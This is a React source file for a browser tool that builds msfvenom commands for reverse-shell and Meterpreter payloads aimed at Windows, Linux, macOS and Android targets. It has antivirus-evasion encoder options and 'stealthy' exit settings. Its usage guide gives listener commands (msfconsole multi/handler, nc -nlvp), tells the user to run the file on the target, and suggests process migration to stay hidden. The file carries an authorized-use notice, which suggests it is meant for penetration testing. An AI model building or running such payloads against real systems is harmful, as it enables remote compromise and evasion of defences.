"use client";

import { useMemo, useState } from "react";
import { Callout } from "@/components/ui/Callout";
import { AuthorizedUseNotice } from "@/components/ui/AuthorizedUseNotice";
import { CopyButton } from "@/components/ui/CopyButton";
import { Tooltip } from "@/components/ui/Tooltip";
import { iconButtonClasses, inputClasses, selectClasses, toggleButtonClasses } from "@/components/ui/formClasses";
import { ArchId, MSFVENOM_ARCHS_BY_ID } from "@/lib/msfvenom/archs";
import { EncoderId, MSFVENOM_ENCODERS_BY_ID, NONE_ENCODER, encodersForArch } from "@/lib/msfvenom/encoders";
import { FormatId, MSFVENOM_FORMATS_BY_ID } from "@/lib/msfvenom/formats";
import {
  MsfvenomSelection,
  buildBashVariable,
  buildCommand,
  buildListenerParamsOnly,
  hasNoEncoderRisk,
  requiresOutputFilename,
  resolvePayloadId,
  suggestFilename,
} from "@/lib/msfvenom/generate";
import { ExitfuncId, Platform } from "@/lib/msfvenom/params";
import { MSFVENOM_CATEGORIES, MSFVENOM_PAYLOADS, MSFVENOM_PAYLOADS_BY_ID, PayloadId } from "@/lib/msfvenom/payloads";
import { MSFVENOM_TEMPLATES, MSFVENOM_TEMPLATES_BY_ID, RECOMMENDED_TEMPLATE_ID } from "@/lib/msfvenom/templates";
import {
  clampIterations,
  clampPort,
  isValidFilename,
  isValidIterations,
  isValidPort,
  sanitizeFilename,
  validateLhost,
} from "@/lib/msfvenom/validation";
import { useRateLimitedGeneration } from "@/lib/hooks/useRateLimitedGeneration";
import { SavedListener, useSavedListeners } from "@/lib/storage/savedListeners";

const HISTORY_KEY = "payloadify:msfvenom-generator:history";
const SAVED_LISTENERS_KEY = "payloadify:msfvenom-generator:saved-listeners";

const PLATFORM_FILTERS: Platform[] = ["windows", "linux", "macos", "android", "multi"];
const PLATFORM_LABELS: Record<Platform, string> = {
  windows: "Windows",
  linux: "Linux",
  macos: "macOS",
  android: "Android",
  multi: "Cross-platform",
};

const EXITFUNC_OPTIONS: { id: ExitfuncId; label: string; whyUseIt: string }[] = [
  { id: "thread", label: "thread (default, stealthy)", whyUseIt: "Exits via thread — the host process stays running, which is less noisy than killing it outright." },
  { id: "process", label: "process (kills the process)", whyUseIt: "Kills the entire host process on exit — obvious and noisy, but simple." },
  { id: "seh", label: "seh (legacy)", whyUseIt: "Exits via SEH — an older, less commonly used exit technique." },
];

const DEFAULT_PAYLOAD = MSFVENOM_PAYLOADS_BY_ID["windows/meterpreter/reverse_tcp"];
const DEFAULT_FORMAT_ID: FormatId = "exe";
const DEFAULT_ARCH_ID: ArchId = "x86";
const DEFAULT_FILENAME = suggestFilename(DEFAULT_PAYLOAD, MSFVENOM_FORMATS_BY_ID[DEFAULT_FORMAT_ID], DEFAULT_ARCH_ID);

const DEFAULTS = {
  platformFilter: "windows" as Platform,
  payloadId: DEFAULT_PAYLOAD.id,
  formatId: DEFAULT_FORMAT_ID,
  encoderId: "none" as EncoderId,
  iterations: 0,
  archId: DEFAULT_ARCH_ID as ArchId | null,
  exitfunc: "thread" as ExitfuncId | null,
  filename: DEFAULT_FILENAME,
  lhost: "10.10.10.10",
};

export function MsfvenomGeneratorTool() {
  const [templateId, setTemplateId] = useState<string | null>(null);
  const [platformFilter, setPlatformFilter] = useState<Platform>(DEFAULTS.platformFilter);
  const [payloadId, setPayloadId] = useState<PayloadId>(DEFAULTS.payloadId);
  const [formatId, setFormatId] = useState<FormatId>(DEFAULTS.formatId);
  const [encoderId, setEncoderId] = useState<EncoderId>(DEFAULTS.encoderId);
  const [iterationsText, setIterationsText] = useState(DEFAULTS.iterations > 0 ? String(DEFAULTS.iterations) : "");
  const [archId, setArchId] = useState<ArchId | null>(DEFAULTS.archId);
  const [exitfunc, setExitfunc] = useState<ExitfuncId | null>(DEFAULTS.exitfunc);
  const [lhost, setLhost] = useState(DEFAULTS.lhost);
  const [lportText, setLportText] = useState("4444");
  const [filename, setFilename] = useState(DEFAULTS.filename);
  const [filenameTouched, setFilenameTouched] = useState(false);
  const [extraOptions, setExtraOptions] = useState("");

  // useSyncExternalStore's getServerSnapshot always returns [] (matching the server-rendered
  // HTML), so hydration can't mismatch even though this list is rendered directly into <option>
  // elements — unlike `history` below, which never reaches the DOM.
  const {
    listeners: savedListeners,
    save: saveListener,
    remove: removeListener,
    removeAll: removeAllListeners,
    update: updateListener,
  } = useSavedListeners(SAVED_LISTENERS_KEY);
  const [selectedListenerId, setSelectedListenerId] = useState("");
  const [saveNameInput, setSaveNameInput] = useState("");
  const [listenerMenuOpen, setListenerMenuOpen] = useState(false);
  const [editingListener, setEditingListener] = useState<SavedListener | null>(null);
  const [editName, setEditName] = useState("");
  const [editLhost, setEditLhost] = useState("");
  const [editLportText, setEditLportText] = useState("");

  const [generatedSelection, setGeneratedSelection] = useState<MsfvenomSelection | null>(null);
  const { blockedMsg, setBlockedMsg, checkAndClear, recordGeneration } = useRateLimitedGeneration(HISTORY_KEY);

  const payload = MSFVENOM_PAYLOADS_BY_ID[payloadId];
  const format = MSFVENOM_FORMATS_BY_ID[formatId];
  const encoder = MSFVENOM_ENCODERS_BY_ID[encoderId] ?? NONE_ENCODER;

  const hostValidation = useMemo(() => validateLhost(lhost), [lhost]);
  const port = Number(lportText);
  const portValid = lportText.trim().length > 0 && isValidPort(port);
  const iterations = Number(iterationsText);
  const iterationsValid = encoderId === "none" || (iterationsText.trim().length > 0 && isValidIterations(iterations, encoder));
  const needsFilename = requiresOutputFilename(payload, format);
  const filenameValid = !needsFilename || isValidFilename(filename);
  const canGenerateNow = hostValidation.ok && portValid && iterationsValid && filenameValid;

  const filteredPayloads = useMemo(() => MSFVENOM_PAYLOADS.filter((p) => p.platform === platformFilter), [platformFilter]);
  const visibleCategories = useMemo(
    () => MSFVENOM_CATEGORIES.filter((c) => filteredPayloads.some((p) => p.category === c)),
    [filteredPayloads],
  );
  const formatOptions = useMemo(() => payload.compatibleFormats.map((id) => MSFVENOM_FORMATS_BY_ID[id]), [payload]);
  /** Real msfvenom encoders are arch-scoped (x86/... vs x64/...) — only offer encoders compatible
   *  with the currently selected architecture (or just "none" for archless payloads like Python). */
  const encoderOptions = useMemo(() => encodersForArch(archId), [archId]);

  const liveRisk = hasNoEncoderRisk(payload, encoder);

  const generatedCommand = useMemo(() => (generatedSelection ? buildCommand(generatedSelection) : null), [generatedSelection]);
  const generatedBashVariable = useMemo(() => (generatedCommand ? buildBashVariable(generatedCommand) : null), [generatedCommand]);
  const generatedListenerParams = useMemo(
    () => (generatedSelection ? buildListenerParamsOnly(generatedSelection) : null),
    [generatedSelection],
  );
  const generatedRisk = generatedSelection ? hasNoEncoderRisk(generatedSelection.payload, generatedSelection.encoder) : false;

  /** Usage Guide listener commands track the live LHOST/LPORT inputs (not the frozen
   *  generatedSelection) so editing them after generating updates the guide immediately —
   *  falling back to the last-generated values only while the live input is invalid/empty. */
  const guideLhost = hostValidation.ok ? lhost.trim() : (generatedSelection?.lhost ?? lhost.trim());
  const guideLport = portValid ? clampPort(port) : (generatedSelection?.lport ?? clampPort(port));

  function resetToCustom() {
    setTemplateId(null);
  }

  /** Reconciles Format/Arch/EXITFUNC/Encoder/Filename against a newly-selected payload, in case
   *  the current values fall outside what the new payload (or its new arch) supports. Reads the
   *  *current* (pre-update) render's closure values once, decides next values, and calls each
   *  setter exactly once — mirrors SqliGeneratorTool's selectDialect() pattern. */
  function applyPayloadReconciliation(nextPayload: (typeof MSFVENOM_PAYLOADS)[number]) {
    const nextFormatId = nextPayload.compatibleFormats.includes(formatId) ? formatId : nextPayload.compatibleFormats[0];
    const nextArchId: ArchId | null =
      nextPayload.archs.length === 0
        ? null
        : archId && nextPayload.archs.includes(archId)
          ? archId
          : (nextPayload.defaultArch ?? nextPayload.archs[0]);
    const nextExitfunc: ExitfuncId | null = nextPayload.supportsExitfunc ? (exitfunc ?? "thread") : null;
    const encoderStillValid = encodersForArch(nextArchId).some((e) => e.id === encoderId);

    setFormatId(nextFormatId);
    setArchId(nextArchId);
    setExitfunc(nextExitfunc);
    if (!encoderStillValid) {
      setEncoderId("none");
      setIterationsText("");
    }

    if (!filenameTouched) {
      setFilename(suggestFilename(nextPayload, MSFVENOM_FORMATS_BY_ID[nextFormatId], nextArchId));
    }
  }

  function selectPayload(id: PayloadId) {
    const nextPayload = MSFVENOM_PAYLOADS_BY_ID[id];
    setPayloadId(id);
    applyPayloadReconciliation(nextPayload);
    resetToCustom();
  }

  function selectPlatform(platform: Platform) {
    setPlatformFilter(platform);
    if (payload.platform !== platform) {
      const firstMatch = MSFVENOM_PAYLOADS.find((p) => p.platform === platform);
      if (firstMatch) selectPayload(firstMatch.id);
    }
  }

  function selectFormat(id: FormatId) {
    setFormatId(id);
    resetToCustom();
    if (!filenameTouched) {
      setFilename(suggestFilename(payload, MSFVENOM_FORMATS_BY_ID[id], archId));
    }
  }

  function selectEncoder(id: EncoderId) {
    setEncoderId(id);
    resetToCustom();
    if (id === "none") {
      setIterationsText("");
    } else {
      setIterationsText(String(clampIterations(iterations || 1, MSFVENOM_ENCODERS_BY_ID[id])));
    }
  }

  function setIterationsTextWrapped(text: string) {
    if (text !== "" && !/^\d+$/.test(text)) return;
    setIterationsText(text);
    resetToCustom();
  }

  function selectArch(id: ArchId) {
    setArchId(id);
    resetToCustom();
    if (!encodersForArch(id).some((e) => e.id === encoderId)) {
      setEncoderId("none");
      setIterationsText("");
    }
    if (!filenameTouched) {
      setFilename(suggestFilename(payload, format, id));
    }
  }

  function toggleStaging() {
    if (!payload.stagingSiblingId) return;
    selectPayload(payload.stagingSiblingId);
  }

  function selectExitfunc(id: ExitfuncId) {
    setExitfunc(id);
    resetToCustom();
  }

  function setExtraOptionsWrapped(text: string) {
    setExtraOptions(text);
    resetToCustom();
  }

  function setFilenameWrapped(text: string) {
    setFilename(text);
    setFilenameTouched(true);
  }

  function selectTemplate(id: string) {
    if (id === "") {
      setTemplateId(null);
      return;
    }
    const t = MSFVENOM_TEMPLATES_BY_ID[id];
    if (!t) return;
    setTemplateId(id);
    setPayloadId(t.payloadId);
    setPlatformFilter(MSFVENOM_PAYLOADS_BY_ID[t.payloadId].platform);
    setFormatId(t.formatId);
    setEncoderId(t.encoderId);
    setIterationsText(t.iterations > 0 ? String(t.iterations) : "");
    setArchId(t.archId);
    setExitfunc(t.exitfunc);
    setFilename(t.filename);
    setFilenameTouched(false);
  }

  function loadListener(id: string) {
    setSelectedListenerId(id);
    const l = savedListeners.find((x) => x.id === id);
    if (l) {
      setLhost(l.lhost);
      setLportText(String(l.lport));
    }
    setListenerMenuOpen(false);
  }

  function saveCurrentListener() {
    if (!hostValidation.ok || !portValid) return;
    const trimmedHost = lhost.trim();
    const label = saveNameInput.trim() || `${trimmedHost}:${lportText.trim()}`;
    const id = typeof crypto !== "undefined" && "randomUUID" in crypto ? crypto.randomUUID() : String(Date.now());
    saveListener({ id, label, lhost: trimmedHost, lport: port });
    setSaveNameInput("");
  }

  function deleteListener(id: string) {
    removeListener(id);
    if (selectedListenerId === id) setSelectedListenerId("");
  }

  function deleteAllListeners() {
    if (savedListeners.length === 0) return;
    const confirmed = window.confirm(`Delete all ${savedListeners.length} saved listeners? This cannot be undone.`);
    if (!confirmed) return;
    removeAllListeners();
    setSelectedListenerId("");
  }

  function openEditListener(l: SavedListener) {
    setEditingListener(l);
    setEditName(l.label);
    setEditLhost(l.lhost);
    setEditLportText(String(l.lport));
    setListenerMenuOpen(false);
  }

  function closeEditListener() {
    setEditingListener(null);
  }

  const editHostValidation = useMemo(() => validateLhost(editLhost), [editLhost]);
  const editPort = Number(editLportText);
  const editPortValid = editLportText.trim().length > 0 && isValidPort(editPort);

  function saveEditedListener() {
    if (!editingListener || !editHostValidation.ok || !editPortValid) return;
    const trimmedHost = editLhost.trim();
    const label = editName.trim() || `${trimmedHost}:${editLportText.trim()}`;
    updateListener(editingListener.id, { label, lhost: trimmedHost, lport: editPort });
    if (selectedListenerId === editingListener.id) {
      setLhost(trimmedHost);
      setLportText(String(editPort));
    }
    setEditingListener(null);
  }

  function resetAll() {
    setTemplateId(null);
    setPlatformFilter(DEFAULTS.platformFilter);
    setPayloadId(DEFAULTS.payloadId);
    setFormatId(DEFAULTS.formatId);
    setEncoderId(DEFAULTS.encoderId);
    setIterationsText(DEFAULTS.iterations > 0 ? String(DEFAULTS.iterations) : "");
    setArchId(DEFAULTS.archId);
    setExitfunc(DEFAULTS.exitfunc);
    setLhost(DEFAULTS.lhost);
    setLportText("");
    setFilename(DEFAULTS.filename);
    setFilenameTouched(false);
    setExtraOptions("");
    setGeneratedSelection(null);
    setBlockedMsg(null);
  }

  function generate() {
    if (!canGenerateNow) return;
    const check = checkAndClear();
    if (!check.allowed) return;

    const finalFilename = needsFilename
      ? isValidFilename(filename)
        ? filename
        : sanitizeFilename(filename, DEFAULTS.filename)
      : filename;

    const selection: MsfvenomSelection = {
      payload,
      arch: archId,
      format,
      encoder,
      iterations,
      lhost: lhost.trim(),
      lport: clampPort(port),
      exitfunc,
      filename: finalFilename,
      extraOptions,
    };
    setGeneratedSelection(selection);
    recordGeneration(check.now);
  }

  return (
    <div className="flex flex-col gap-6">
      <AuthorizedUseNotice />

      <div>
        <label className="mb-1 block text-sm font-medium">Template</label>
        <select value={templateId ?? ""} onChange={(e) => selectTemplate(e.target.value)} className={`${selectClasses} w-full`}>
          <option value="">Custom</option>
          {MSFVENOM_TEMPLATES.map((t) => (
            <option key={t.id} value={t.id}>
              {t.label}
              {t.id === RECOMMENDED_TEMPLATE_ID ? " — ★ Recommended" : ""}
            </option>
          ))}
        </select>
      </div>

      <div>
        <label className="mb-1 block text-sm font-medium">Platform</label>
        <div className="flex flex-wrap gap-1">
          {PLATFORM_FILTERS.map((p) => (
            <button key={p} type="button" onClick={() => selectPlatform(p)} className={toggleButtonClasses(platformFilter === p)}>
              {PLATFORM_LABELS[p]}
            </button>
          ))}
        </div>
      </div>

      <div>
        <label className="mb-1 flex items-center text-sm font-medium">
          Payload
          <Tooltip text={payload.whyUseIt} />
        </label>
        <select value={payloadId} onChange={(e) => selectPayload(e.target.value)} className={`${selectClasses} w-full`}>
          {visibleCategories.map((category) => (
            <optgroup key={category} label={category}>
              {filteredPayloads
                .filter((p) => p.category === category)
                .map((p) => (
                  <option key={p.id} value={p.id}>
                    {p.label}
                  </option>
                ))}
            </optgroup>
          ))}
        </select>
        {payload.note && <p className="mt-2 text-xs text-amber-600 dark:text-amber-400">{payload.note}</p>}
        <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">{payload.whyUseIt}</p>
      </div>

      <div className="grid gap-4 sm:grid-cols-2">
        <div>
          <label className="mb-1 flex items-center text-sm font-medium">
            Architecture
            <Tooltip text="Match this to your target's real architecture — 32-bit payloads run on 64-bit Windows via WoW64, but not the reverse." />
          </label>
          {payload.archs.length === 0 ? (
            <input value="N/A" disabled className={`${selectClasses} w-full opacity-50`} />
          ) : (
            <select
              value={archId ?? ""}
              onChange={(e) => selectArch(e.target.value as ArchId)}
              disabled={payload.archs.length <= 1}
              className={`${selectClasses} w-full disabled:opacity-50`}
            >
              {payload.archs.map((id) => (
                <option key={id} value={id}>
                  {MSFVENOM_ARCHS_BY_ID[id].label}
                </option>
              ))}
            </select>
          )}
        </div>
        <div>
          <label className="mb-1 flex items-center text-sm font-medium">
            Output format
            <Tooltip text="Only formats compatible with the selected payload are shown." />
          </label>
          <select value={formatId} onChange={(e) => selectFormat(e.target.value)} className={`${selectClasses} w-full`}>
            {formatOptions.map((f) => (
              <option key={f.id} value={f.id}>
                {f.label}
              </option>
            ))}
          </select>
          {format.note && <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">{format.note}</p>}
        </div>
      </div>

      <details className="rounded border border-zinc-200 dark:border-zinc-800">
        <summary className="cursor-pointer px-3 py-2 text-sm font-medium">+ Evasion Options</summary>
        <div className="flex flex-col gap-4 px-3 pb-3">
          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <label className="mb-1 flex items-center text-sm font-medium">
                Encoder
                <Tooltip text={encoder.whyUseIt} />
              </label>
              <select value={encoderId} onChange={(e) => selectEncoder(e.target.value as EncoderId)} className={`${selectClasses} w-full`}>
                {encoderOptions.map((enc) => (
                  <option key={enc.id} value={enc.id}>
                    {enc.label}
                  </option>
                ))}
              </select>
              <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">{encoder.whyUseIt}</p>
              {archId === null && (
                <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">This payload has no architecture, so no binary encoders apply.</p>
              )}
            </div>
            <div>
              <label className="mb-1 flex items-center text-sm font-medium">
                Iterations
                <Tooltip text="More iterations means more obfuscation, but slower generation. 2-4 is a typical sweet spot." />
              </label>
              <input
                type="number"
                min={1}
                max={encoder.maxIterations || 1}
                value={iterationsText}
                disabled={encoderId === "none"}
                onChange={(e) => setIterationsTextWrapped(e.target.value)}
                className={`${selectClasses} w-full disabled:opacity-40`}
              />
              {encoderId !== "none" && !iterationsValid && (
                <p className="mt-1 text-xs text-red-600 dark:text-red-400">
                  {iterationsText.trim().length === 0
                    ? "Iterations must be at least 1."
                    : `Enter a value between 1 and ${encoder.maxIterations}.`}
                </p>
              )}
            </div>
          </div>
          {liveRisk && (
            <Callout variant="warning">
              This payload has no encoding. Antivirus may detect it. Consider adding an encoder above (x86/shikata_ga_nai is a good default
              on x86; x64/xor_dynamic for x64).
            </Callout>
          )}
        </div>
      </details>

      <div className="grid gap-4 sm:grid-cols-2">
        <div>
          <label className="mb-1 block text-sm font-medium">LHOST (attacker IP)</label>
          <input
            type="text"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            placeholder="10.10.10.10"
            className={inputClasses}
          />
          {lhost.length > 0 && !hostValidation.ok && <p className="mt-1 text-xs text-red-600 dark:text-red-400">{hostValidation.message}</p>}
        </div>
        <div>
          <label className="mb-1 block text-sm font-medium">LPORT</label>
          <input
            type="number"
            min={1}
            max={65535}
            value={lportText}
            onChange={(e) => setLportText(e.target.value)}
            onBlur={() => {
              if (lportText.trim().length === 0) return;
              setLportText(String(clampPort(Number(lportText))));
            }}
            placeholder="4444"
            className={`${selectClasses} w-full`}
          />
          {lportText.length > 0 && !portValid && <p className="mt-1 text-xs text-red-600 dark:text-red-400">Enter a port between 1 and 65535.</p>}
        </div>
      </div>

      <div className="flex flex-wrap items-end gap-2">
        <div className="flex-1 min-w-[160px]">
          <label className="mb-1 block text-sm font-medium">Save this listener as</label>
          <input
            type="text"
            value={saveNameInput}
            onChange={(e) => setSaveNameInput(e.target.value)}
            placeholder={lhost && lportText ? `${lhost}:${lportText}` : "e.g. prod-listener"}
            className={inputClasses}
          />
        </div>
        <button
          type="button"
          onClick={saveCurrentListener}
          disabled={!hostValidation.ok || !portValid}
          className={iconButtonClasses}
        >
          Save This Listener
        </button>
      </div>

      <div>
        <label className="mb-1 block text-sm font-medium">Saved listeners</label>
        <p className="mb-1 text-xs text-zinc-500 dark:text-zinc-400">
          Saved listeners are stored in your browser only. They&apos;ll persist across refreshes, but won&apos;t sync across devices or browsers.
        </p>
        <div className="flex flex-wrap items-center gap-2">
          <div className="relative">
            <button
              type="button"
              onClick={() => setListenerMenuOpen((open) => !open)}
              className={`${selectClasses} min-w-[220px] text-left`}
            >
              {savedListeners.find((l) => l.id === selectedListenerId)?.label ?? "— Load a saved listener —"}
              <span className="float-right text-zinc-400">▾</span>
            </button>
            {listenerMenuOpen && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setListenerMenuOpen(false)} />
                <div className="absolute z-20 mt-1 max-h-64 w-full min-w-[280px] overflow-auto rounded border border-zinc-300 bg-white shadow-lg dark:border-zinc-700 dark:bg-zinc-900">
                  <button
                    type="button"
                    onClick={() => loadListener("")}
                    className="block w-full px-3 py-2 text-left text-sm text-zinc-500 hover:bg-zinc-100 dark:text-zinc-400 dark:hover:bg-zinc-800"
                  >
                    — None selected —
                  </button>
                  {savedListeners.length === 0 && (
                    <p className="px-3 py-2 text-sm text-zinc-400 dark:text-zinc-500">No saved listeners yet.</p>
                  )}
                  {savedListeners.map((l) => (
                    <div
                      key={l.id}
                      className="group flex items-center justify-between px-1 py-1 hover:bg-zinc-100 dark:hover:bg-zinc-800"
                    >
                      <button
                        type="button"
                        onClick={() => loadListener(l.id)}
                        className="min-w-0 flex-1 truncate px-2 py-1 text-left text-sm"
                      >
                        {l.label}{" "}
                        <span className="text-xs text-zinc-400 dark:text-zinc-500">
                          {l.lhost}:{l.lport}
                        </span>
                      </button>
                      <span className="hidden shrink-0 items-center gap-1 pr-1 group-hover:flex">
                        <button
                          type="button"
                          onClick={() => openEditListener(l)}
                          title="Edit"
                          aria-label={`Edit ${l.label}`}
                          className="rounded px-1.5 py-0.5 text-sm text-zinc-500 hover:bg-zinc-200 dark:text-zinc-400 dark:hover:bg-zinc-700"
                        >
                          ✎
                        </button>
                        <button
                          type="button"
                          onClick={() => deleteListener(l.id)}
                          title="Delete"
                          aria-label={`Delete ${l.label}`}
                          className="rounded px-1.5 py-0.5 text-sm text-zinc-500 hover:bg-zinc-200 dark:text-zinc-400 dark:hover:bg-zinc-700"
                        >
                          ✕
                        </button>
                      </span>
                    </div>
                  ))}
                </div>
              </>
            )}
          </div>
          <button
            type="button"
            onClick={deleteAllListeners}
            disabled={savedListeners.length === 0}
            className={iconButtonClasses}
          >
            Delete All
          </button>
        </div>
      </div>

      {editingListener && (
        <div className="fixed inset-0 z-30 flex items-center justify-center bg-black/40 p-4">
          <div className="w-full max-w-sm rounded border border-zinc-300 bg-white p-4 shadow-lg dark:border-zinc-700 dark:bg-zinc-900">
            <div className="mb-3 flex items-center justify-between">
              <h3 className="text-sm font-medium">Edit Saved Listener</h3>
              <button type="button" onClick={closeEditListener} aria-label="Close" className="text-zinc-400 hover:text-zinc-600 dark:hover:text-zinc-200">
                ✕
              </button>
            </div>
            <div className="flex flex-col gap-3">
              <div>
                <label className="mb-1 block text-sm font-medium">Name</label>
                <input type="text" value={editName} onChange={(e) => setEditName(e.target.value)} className={inputClasses} />
              </div>
              <div>
                <label className="mb-1 block text-sm font-medium">LHOST</label>
                <input type="text" value={editLhost} onChange={(e) => setEditLhost(e.target.value)} className={inputClasses} />
                {editLhost.length > 0 && !editHostValidation.ok && (
                  <p className="mt-1 text-xs text-red-600 dark:text-red-400">{editHostValidation.message}</p>
                )}
              </div>
              <div>
                <label className="mb-1 block text-sm font-medium">LPORT</label>
                <input
                  type="number"
                  min={1}
                  max={65535}
                  value={editLportText}
                  onChange={(e) => setEditLportText(e.target.value)}
                  className={`${selectClasses} w-full`}
                />
                {editLportText.length > 0 && !editPortValid && (
                  <p className="mt-1 text-xs text-red-600 dark:text-red-400">Enter a port between 1 and 65535.</p>
                )}
              </div>
            </div>
            <div className="mt-4 flex justify-end gap-2">
              <button type="button" onClick={closeEditListener} className={iconButtonClasses}>
                Cancel
              </button>
              <button
                type="button"
                onClick={saveEditedListener}
                disabled={!editHostValidation.ok || !editPortValid}
                className={iconButtonClasses}
              >
                Save
              </button>
            </div>
          </div>
        </div>
      )}

      <details className="rounded border border-zinc-200 dark:border-zinc-800">
        <summary className="cursor-pointer px-3 py-2 text-sm font-medium">+ Advanced Options</summary>
        <div className="flex flex-col gap-4 px-3 pb-3">
          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <label className="mb-1 flex items-center text-sm font-medium">
                Staging
                <Tooltip text="Staged payloads are a small initial dropper that downloads the rest on connection. Stageless payloads embed everything in one file." />
              </label>
              {payload.stagingSiblingId ? (
                <button type="button" onClick={toggleStaging} className={`${selectClasses} w-full text-left`}>
                  {payload.staging === "staged" ? "Staged (click to switch to stageless)" : "Stageless (click to switch to staged)"}
                </button>
              ) : (
                <input value={payload.staging === "staged" ? "Staged" : "Stageless"} disabled className={`${selectClasses} w-full opacity-50`} />
              )}
            </div>
            <div>
              <label className="mb-1 flex items-center text-sm font-medium">
                EXITFUNC
                <Tooltip text="Windows-only. Controls how the payload's process exits when the session ends." />
              </label>
              <select
                value={exitfunc ?? ""}
                onChange={(e) => selectExitfunc(e.target.value as ExitfuncId)}
                disabled={!payload.supportsExitfunc}
                className={`${selectClasses} w-full disabled:opacity-40`}
              >
                {EXITFUNC_OPTIONS.map((opt) => (
                  <option key={opt.id} value={opt.id}>
                    {opt.label}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <div>
            <label className="mb-1 block text-sm font-medium">Filename</label>
            <input
              type="text"
              value={filename}
              disabled={!needsFilename}
              onChange={(e) => setFilenameWrapped(e.target.value)}
              className={`${inputClasses} disabled:opacity-40`}
            />
            {needsFilename && filename.length > 0 && !filenameValid && (
              <p className="mt-1 text-xs text-red-600 dark:text-red-400">
                Filename can only contain letters, numbers, dots, hyphens, and underscores.
              </p>
            )}
            {!needsFilename && (
              <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">This format prints to the console — no -o filename is generated.</p>
            )}
          </div>

          <div>
            <label className="mb-1 flex items-center text-sm font-medium">
              Extra payload options
              <Tooltip text="Free text, appended verbatim before -o. E.g. AutoLoadingUser=true, or -B '\x00\x0a\x0d' to exclude bad characters." />
            </label>
            <input
              type="text"
              value={extraOptions}
              onChange={(e) => setExtraOptionsWrapped(e.target.value)}
              placeholder="AutoLoadingUser=true"
              className={inputClasses}
            />
          </div>
        </div>
      </details>

      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          onClick={generate}
          disabled={!canGenerateNow}
          className="rounded bg-zinc-900 px-3 py-1.5 text-sm text-white hover:bg-zinc-700 disabled:opacity-50 dark:bg-zinc-100 dark:text-zinc-900 dark:hover:bg-zinc-300"
        >
          Generate Command
        </button>
        <button
          type="button"
          onClick={resetAll}
          className="rounded border border-zinc-300 px-3 py-1.5 text-sm text-zinc-700 hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
        >
          Reset
        </button>
      </div>

      {blockedMsg && <Callout variant="danger">{blockedMsg}</Callout>}

      {!generatedCommand && !blockedMsg && <Callout variant="info">Pick your options above, then click Generate Command.</Callout>}

      {generatedSelection && generatedCommand && (
        <div className="flex flex-col gap-4">
          <div>
            <div className="mb-1 flex items-center justify-between">
              <p className="text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Command</p>
              <div className="flex gap-2">
                <CopyButton text={generatedCommand} label="Copy Command" />
                {generatedBashVariable && <CopyButton text={generatedBashVariable} label="Copy as Bash Variable" />}
                {generatedListenerParams && <CopyButton text={generatedListenerParams} label="Copy LHOST/LPORT" />}
              </div>
            </div>
            <code className="block rounded border border-zinc-200 bg-white p-3 text-sm break-all whitespace-pre-wrap dark:border-zinc-800 dark:bg-zinc-900">
              {generatedCommand}
            </code>
            <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">
              {resolvePayloadId(generatedSelection.payload, generatedSelection.arch)} · {generatedSelection.format.label} ·{" "}
              {generatedSelection.encoder.label}
            </p>
            {generatedRisk && (
              <div className="mt-2">
                <Callout variant="warning">
                  This payload has no encoding. Antivirus may detect it immediately — consider regenerating with an encoder.
                </Callout>
              </div>
            )}
          </div>

          <details className="rounded border border-zinc-200 dark:border-zinc-800" open>
            <summary className="cursor-pointer px-3 py-2 text-sm font-medium">Usage Guide</summary>
            <div className="flex flex-col gap-3 px-3 pb-3 text-sm text-zinc-600 dark:text-zinc-400">
              <p>Once you have your payload, catch it with a matching listener:</p>
              <div>
                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Multi/handler (works for all Metasploit payloads)</p>
                <div className="flex items-center justify-between gap-2">
                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
                    {`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
                  </code>
                  <CopyButton
                    text={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
                  />
                </div>
              </div>
              <div>
                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">
                  Raw listener (plain, non-Meterpreter shell payloads only)
                </p>
                <div className="flex items-center justify-between gap-2">
                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
                    {`nc -nlvp ${guideLport}`}
                  </code>
                  <CopyButton text={`nc -nlvp ${guideLport}`} />
                </div>
              </div>
              <p>
                Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
                reachable from the target (not 127.0.0.1), and firewall rules on both ends.
              </p>
              <p>
                Once you have a session, Meterpreter&apos;s <code>migrate &lt;PID&gt;</code> command can move execution into another process (e.g.
                explorer.exe) for stealth — this is a post-exploitation msfconsole command, not something msfvenom generates.
              </p>
            </div>
          </details>
        </div>
      )}
    </div>
  );
}
